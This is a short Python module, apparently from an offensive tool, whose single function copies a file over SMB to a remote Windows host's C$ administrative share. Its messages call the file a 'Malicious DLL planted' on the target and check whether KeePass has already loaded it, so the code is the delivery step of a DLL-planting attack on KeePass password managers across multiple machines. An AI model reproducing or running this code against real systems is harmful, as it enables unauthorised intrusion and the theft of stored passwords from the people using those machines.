#!/usr/bin/python3

import os

def upload(smbClient, thread_index, destination: str, local_filepath: str):
    f = open(local_filepath, 'rb')

    try:
        smbClient.putFile("C$", destination, f.read)
        print(f"[THREAD {thread_index}][+] Malicious DLL planted on {smbClient.getRemoteHost()}")
    except Exception as e: 
        if "STATUS_SHARING_VIOLATION" in str(e):
            print(f"[THREAD {thread_index}][!] KeePass seems to be already running and to have loaded the DLL on target {smbClient.getRemoteHost()}")
        else:
            print(f"[THREAD {thread_index}][!] {str(e)} on {smbClient.getRemoteHost()}")

        f.close()
        return False

    f.close()
    return True

